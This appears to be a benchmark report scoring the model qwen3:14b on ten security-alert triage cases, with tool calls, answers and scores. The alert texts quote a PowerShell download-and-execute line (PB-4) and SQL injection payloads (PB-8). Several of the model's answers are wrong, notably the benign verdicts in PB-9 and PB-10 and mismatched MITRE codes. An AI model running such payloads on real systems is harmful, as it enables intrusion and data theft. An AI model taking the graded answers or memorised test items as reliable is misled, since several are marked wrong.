# Playbook benchmark — `qwen3:14b`

Model: `qwen3:14b`  
Mode: **harness-executed**  
Run started: 2026-05-06 03:29:43  
Cases: 10  
Format failures: 0  

## Summary

| Metric | Score |
|---|---|
| Composite context-understanding score | **72%** |
| Verdict accuracy | 8/10 (80%) |
| Severity accuracy | 8/10 (80%) |
| MITRE accuracy | 4/10 (40%) |
| Tool-selection accuracy | 9/10 (90%) |
| Format failures | 0/10 |
| Forbidden tool calls (e.g. auto-isolate on benign) | 0 |
| Not-found tool responses (hallucinated entities) | 4 |
| p50 latency | 21.9 s |
| p95 latency | 28.7 s |

## Per-case results

| Case | Expected | Verdict | Severity | MITRE | Tools | Latency |
|---|---|---|---|---|---|---|
| PB-1 | beni | PASS | PASS | PASS | PASS | 23.4s |
| PB-2 | inci | PASS | PASS | FAIL | PASS | 26.3s |
| PB-3 | inci | PASS | PASS | PASS | PASS | 19.6s |
| PB-4 | inci | PASS | PASS | FAIL | FAIL | 31.9s |
| PB-5 | inci | PASS | PASS | FAIL | PASS | 13.8s |
| PB-6 | inci | PASS | PASS | PASS | PASS | 21.9s |
| PB-7 | beni | PASS | PASS | PASS | PASS | 15.8s |
| PB-8 | inci | PASS | PASS | FAIL | PASS | 20.7s |
| PB-9 | inci | FAIL | FAIL | FAIL | PASS | 15.2s |
| PB-10 | inci | FAIL | FAIL | FAIL | PASS | 28.7s |

## Per-case detail

### PB-1 — expected: **benign** (severity ['info', 'low'], MITRE n/a)

_Alert_: Single-event alert: user `alice` (laptop 10.0.4.22) authenticated to the corporate intranet at 09:02 local time on a workday and opened her email. No prior failed attempts. Source matches her usual IP range.

_Latency_: 23.35s · GPU 96%/18592MB · CPU 28% · RAM 33603MB

_Tool calls_:
```
- cmdb.get_asset({"host_or_ip": "10.0.4.22"}) -> {"query": "10.0.4.22", "found": true, "hostname": "alice-laptop", "criticality": "low", "owner": "alice", "business_unit": "marketing", "os": "macOS 14", "tags"
- siem.query_logs({"query": "alice", "hours": 2}) -> {"query": "alice", "hours": 2, "matched": 0, "events": [], "summary": "No matching events in the requested window."}
```

_Parsed answer_:
```json
{
  "verdict": "benign",
  "severity": "info",
  "mitre": [],
  "tools_used": [
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "No suspicious activity detected: SIEM found 0 events in the last 2 hours for user 'alice', and the asset 10.0.4.22 is a low-criticality endpoint with no security tags."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['cmdb.get_asset'])

### PB-2 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1078', 'T1078.002', 'T1021', 'T1021.001'])

_Alert_: Domain admin account `dom_admin_01` authenticated successfully from external IP 41.78.122.18 at 03:14 UTC. Within 4 minutes the same account opened 18 RDP sessions to internal hosts (DC01, FILER-02, FINANCE-DB, ENG-FILE, BACKUP-01, …).

_Latency_: 26.26s · GPU 93%/14276MB · CPU 20% · RAM 33374MB

_Tool calls_:
```
- threat_intel.lookup_ip({"ip": "41.78.122.18"}) -> {"ip": "41.78.122.18", "verdict": "malicious", "score": 92, "geo": "NG", "tags": ["c2", "rdp-bruteforce"], "first_seen": "2026-04-22", "notes": "Recent C2 sight
- cmdb.get_asset({"host_or_ip": "DC01"}) -> {"query": "DC01", "found": true, "hostname": "dc01", "criticality": "critical", "owner": "infra-team", "business_unit": "platform", "os": "Windows Server 2022",
- cmdb.get_asset({"host_or_ip": "FILER-02"}) -> {"query": "FILER-02", "found": false, "notes": "Not in CMDB \u2014 likely external or unmanaged asset."}
- cmdb.get_asset({"host_or_ip": "FINANCE-DB"}) -> {"query": "FINANCE-DB", "found": false, "notes": "Not in CMDB \u2014 likely external or unmanaged asset."}
- cmdb.get_asset({"host_or_ip": "ENG-FILE"}) -> {"query": "ENG-FILE", "found": false, "notes": "Not in CMDB \u2014 likely external or unmanaged asset."}
- cmdb.get_asset({"host_or_ip": "BACKUP-01"}) -> {"query": "BACKUP-01", "found": false, "notes": "Not in CMDB \u2014 likely external or unmanaged asset."}
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "critical",
  "mitre": [
    "T1135.001"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset"
  ],
  "rationale": "Origin IP 41.78.122.18 has a malicious verdict (score 92) with RDP-bruteforce tags; the domain admin account accessed DC01 (a tier-0 domain controller) shortly after authentication, indicating high-risk lateral movement."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=PASS (matched: ['threat_intel.lookup_ip', 'cmdb.get_asset']) not_found_calls=4

### PB-3 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1110.003', 'T1110.004'])

_Alert_: Web server `webhost` (10.0.4.10): 50,000 POST requests to /wp-login.php from 1,200 distinct IPs within 10 minutes, including 3 successful logins to admin accounts. Sample source IP: 89.248.165.74.

_Latency_: 19.64s · GPU 92%/14276MB · CPU 20% · RAM 33344MB

_Tool calls_:
```
- threat_intel.lookup_ip({"ip": "89.248.165.74"}) -> {"ip": "89.248.165.74", "verdict": "malicious", "score": 88, "geo": "NL", "tags": ["botnet", "wp-bruteforce"], "first_seen": "2026-03-11", "notes": "Known WordP
- cmdb.get_asset({"host_or_ip": "webhost"}) -> {"query": "webhost", "found": true, "hostname": "webhost", "criticality": "high", "owner": "infra-team", "business_unit": "platform", "os": "Ubuntu 22.04", "tag
- siem.query_logs({"query": "POST /wp-login.php", "hours": 1}) -> {"query": "POST /wp-login.php", "hours": 1, "matched": 50312, "events": [{"ts": "2026-05-06T14:01:02Z", "src_ip": "89.248.165.74", "method": "POST", "path": "/w
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1110.003"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "Threat Intel shows 89.248.165.74 is a malicious botnet node (score 88) involved in WordPress brute-force attacks. SIEM confirms 50,000+ POST requests with 3 successful admin logins from unseen IPs, and the target webhost is a high-criticality public-facing WordPress server."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['threat_intel.lookup_ip', 'siem.query_logs'])

### PB-4 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1059.001', 'T1059', 'T1566.001', 'T1204', 'T1204.002'])

_Alert_: EDR alert on host WIN-DEV-04: `winword.exe` spawned `powershell.exe` which executed `IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.15/a.ps1')`. User: dave.

_Latency_: 31.89s · GPU 93%/14276MB · CPU 27% · RAM 34912MB

_Tool calls_:
```
- threat_intel.lookup_ip({"ip": "185.220.101.15"}) -> {"ip": "185.220.101.15", "verdict": "malicious", "score": 95, "geo": "DE", "tags": ["tor-exit", "malware-c2"], "first_seen": "2025-11-29", "notes": "Tor exit no
- cmdb.get_asset({"host_or_ip": "WIN-DEV-04"}) -> {"query": "WIN-DEV-04", "found": true, "hostname": "WIN-DEV-04", "criticality": "medium", "owner": "dave", "business_unit": "engineering", "os": "Windows 11", "
- siem.query_logs({"query": "dave", "hours": 24}) -> {"query": "dave", "hours": 24, "matched": 0, "events": [], "summary": "No matching events in the requested window."}
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1204.001"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "The IP 185.220.101.15 has a malicious verdict (score 95) as a Tor exit node hosting Cobalt Strike payloads; the process chain from winword.exe to PowerShell executing a remote script aligns with T1204.001 (User Execution)."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=FAIL

### PB-5 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1071.004', 'T1071', 'T1048.003', 'T1048'])

_Alert_: DNS server logs show internal host 10.0.4.55 issuing 4,000+ unique subdomain queries against `cdn-update.xyz` over 2 hours, with TXT-record responses averaging 200 bytes.

_Latency_: 13.76s · GPU 98%/14276MB · CPU 33% · RAM 33662MB

_Tool calls_:
```
- threat_intel.lookup_domain({"domain": "cdn-update.xyz"}) -> {"domain": "cdn-update.xyz", "verdict": "malicious", "score": 90, "registered": "2026-04-22", "tags": ["dga-like", "dns-tunnel"], "notes": "Registered 14 days a
- cmdb.get_asset({"host_or_ip": "10.0.4.55"}) -> {"query": "10.0.4.55", "found": true, "hostname": "ops-jumphost", "criticality": "high", "owner": "secops", "business_unit": "platform", "os": "Ubuntu 22.04", "
- siem.query_logs({"query": "10.0.4.55 cdn-update.xyz", "hours": 2}) -> {"query": "10.0.4.55 cdn-update.xyz", "hours": 2, "matched": 0, "events": [], "summary": "No matching events in the requested window."}
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1071.001"
  ],
  "tools_used": [
    "threat_intel.lookup_domain",
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "Domain cdn-update.xyz has a malicious verdict (score 90) with DNS-tunnel tags; internal host 10.0.4.55 (ops-jumphost) has a 'no-egress-allowed' tag but issued 4,000+ subdomain queries to it, violating expected behavior."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=PASS (matched: ['threat_intel.lookup_domain', 'cmdb.get_asset'])

### PB-6 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1078'])

_Alert_: sshd on host `webhost` (10.0.4.10) recorded 7 failed password attempts for distinct usernames (admin, root, oracle, postgres, git, test, ubuntu) from source IP 185.220.101.45 between 03:41:02 and 03:41:20, followed by a successful login as `ubuntu` from the same IP at 03:43:21.

_Latency_: 21.88s · GPU 93%/14276MB · CPU 37% · RAM 33381MB

_Tool calls_:
```
- threat_intel.lookup_ip({"ip": "185.220.101.45"}) -> {"ip": "185.220.101.45", "verdict": "malicious", "score": 95, "geo": "DE", "tags": ["tor-exit", "ssh-bruteforce"], "first_seen": "2025-12-04", "notes": "Tor exi
- cmdb.get_asset({"host_or_ip": "webhost"}) -> {"query": "webhost", "found": true, "hostname": "webhost", "criticality": "high", "owner": "infra-team", "business_unit": "platform", "os": "Ubuntu 22.04", "tag
- siem.query_logs({"query": "source_ip=185.220.101.45 AND destination_host=webhost", "hours": 1}) -> {"query": "source_ip=185.220.101.45 AND destination_host=webhost", "hours": 1, "matched": 9, "events": [{"ts": "2026-05-06T03:41:02Z", "host": "webhost", "subje
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1078",
    "T1110.003"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "Source IP 185.220.101.45 has a malicious verdict (score 95) with 'ssh-bruteforce' tag; SIEM shows 7 failed SSH attempts followed by a successful 'ubuntu' login; target host 'webhost' is high-criticality and public-facing."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['threat_intel.lookup_ip', 'cmdb.get_asset'])

### PB-7 — expected: **benign** (severity ['info', 'low'], MITRE n/a)

_Alert_: Routine sshd event on `webhost` (10.0.4.10): publickey login accepted for `alice` from 10.0.4.22 at 09:14:32. PAM session opened. systemd-logind started session 2841.

_Latency_: 15.84s · GPU 93%/14276MB · CPU 56% · RAM 33387MB

_Tool calls_:
```
- cmdb.get_asset({"host_or_ip": "webhost"}) -> {"query": "webhost", "found": true, "hostname": "webhost", "criticality": "high", "owner": "infra-team", "business_unit": "platform", "os": "Ubuntu 22.04", "tag
- cmdb.get_asset({"host_or_ip": "10.0.4.22"}) -> {"query": "10.0.4.22", "found": true, "hostname": "alice-laptop", "criticality": "low", "owner": "alice", "business_unit": "marketing", "os": "macOS 14", "tags"
```

_Parsed answer_:
```json
{
  "verdict": "benign",
  "severity": "info",
  "mitre": [],
  "tools_used": [
    "cmdb.get_asset",
    "cmdb.get_asset"
  ],
  "rationale": "Both source (10.0.4.22: alice-laptop) and target (webhost) are internal assets with no security tags; publickey authentication is a standard access method for authorized users."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['cmdb.get_asset'])

### PB-8 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1190'])

_Alert_: Apache access log on `webhost` (10.0.4.10) shows 4 requests from 185.62.190.13 within 4 seconds: `GET /products.php?id=1' OR '1'='1--`, `GET /products.php?id=1+UNION+SELECT+username,password+FROM+users--`, `GET /products.php?id=1;DROP+TABLE+users--`, `GET /products.php?id=1+AND+SLEEP(5)--`. The UNION SELECT request returned a 200 with a 4129-byte body.

_Latency_: 20.73s · GPU 92%/14276MB · CPU 33% · RAM 33416MB

_Tool calls_:
```
- threat_intel.lookup_ip({"ip": "185.62.190.13"}) -> {"ip": "185.62.190.13", "verdict": "suspicious", "score": 78, "geo": "GB", "tags": ["sqlmap", "scanner"], "first_seen": "2026-04-30", "notes": "Recent sqlmap us
- cmdb.get_asset({"host_or_ip": "10.0.4.10"}) -> {"query": "10.0.4.10", "found": true, "hostname": "webhost", "criticality": "high", "owner": "infra-team", "business_unit": "platform", "os": "Ubuntu 22.04", "t
- siem.query_logs({"query": "185.62.190.13", "hours": 1}) -> {"query": "185.62.190.13", "hours": 1, "matched": 4, "events": [{"ts": "2026-05-06T14:22:03Z", "src_ip": "185.62.190.13", "method": "GET", "path": "/products.ph
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1110.003"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "Threat Intel marks 185.62.190.13 as suspicious with sqlmap/scanner tags (score 78); SIEM shows 4 SQLi payloads against /products.php with data leakage (4KB response); target webhost is public-facing with high criticality."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=PASS (matched: ['threat_intel.lookup_ip', 'cmdb.get_asset'])

### PB-9 — expected: **incident** (severity ['medium', 'high'], MITRE ['T1098', 'T1548', 'T1136', 'T1078'])

_Alert_: On host `webhost` at 03:17:42, user `bob` (TTY pts/3) ran `sudo /usr/sbin/usermod -aG sudo svc_backup`. The change was applied (`add 'svc_backup' to group 'sudo'`). bob is a developer account with sudo rights but no documented need to modify service-account permissions at 03:17.

_Latency_: 15.22s · GPU 93%/14276MB · CPU 21% · RAM 33787MB

_Tool calls_:
```
- cmdb.get_asset({"host_or_ip": "webhost"}) -> {"query": "webhost", "found": true, "hostname": "webhost", "criticality": "high", "owner": "infra-team", "business_unit": "platform", "os": "Ubuntu 22.04", "tag
- siem.query_logs({"query": "user: bob AND command: usermod", "hours": 1}) -> {"query": "user: bob AND command: usermod", "hours": 1, "matched": 0, "events": [], "summary": "No matching events in the requested window."}
```

_Parsed answer_:
```json
{
  "verdict": "benign",
  "severity": "info",
  "mitre": [],
  "tools_used": [
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "SIEM query found no prior usermod events by 'bob' in the last hour, and threat_intel was not invoked for any external entities. The internal host 'webhost' is high-criticality but no anomalous tags were present."
}
```

_Scoring_: verdict=FAIL severity=FAIL mitre=FAIL tools=PASS (matched: ['cmdb.get_asset', 'siem.query_logs'])

### PB-10 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1110.003', 'T1078', 'T1078.002'])

_Alert_: Domain controller DC01: 5 sequential EventID 4625 (BadPassword) events for account `Administrator`, LogonType 3, source IP 192.168.50.13 (workstation KIOSK-04) between 02:18:14 and 02:18:24, followed by an EventID 4624 (success) for the same account from the same IP at 02:21:42.

_Latency_: 28.74s · GPU 93%/14276MB · CPU 34% · RAM 33698MB

_Tool calls_:
```
- cmdb.get_asset({"host_or_ip": "DC01"}) -> {"query": "DC01", "found": true, "hostname": "dc01", "criticality": "critical", "owner": "infra-team", "business_unit": "platform", "os": "Windows Server 2022",
- cmdb.get_asset({"host_or_ip": "KIOSK-04"}) -> {"query": "KIOSK-04", "found": true, "hostname": "KIOSK-04", "criticality": "low", "owner": "facilities", "business_unit": "office", "os": "Windows 10", "tags":
- siem.query_logs({"query": "EventID=4625 and TargetUserName=Administrator and IpAddress=192.168.50.13", "hours": 1}) -> {"query": "EventID=4625 and TargetUserName=Administrator and IpAddress=192.168.50.13", "hours": 1, "matched": 0, "events": [], "summary": "No matching events in
```

_Parsed answer_:
```json
{
  "verdict": "benign",
  "severity": "info",
  "mitre": [],
  "tools_used": [
    "cmdb.get_asset",
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "SIEM query found no additional events corroborating the alert; KIOSK-04 has 'no-admin-auth-expected' tag but the single successful login after 5 failures may represent a legitimate brute-force attempt with eventual success, not necessarily malicious."
}
```

_Scoring_: verdict=FAIL severity=FAIL mitre=FAIL tools=PASS (matched: ['cmdb.get_asset', 'siem.query_logs'])
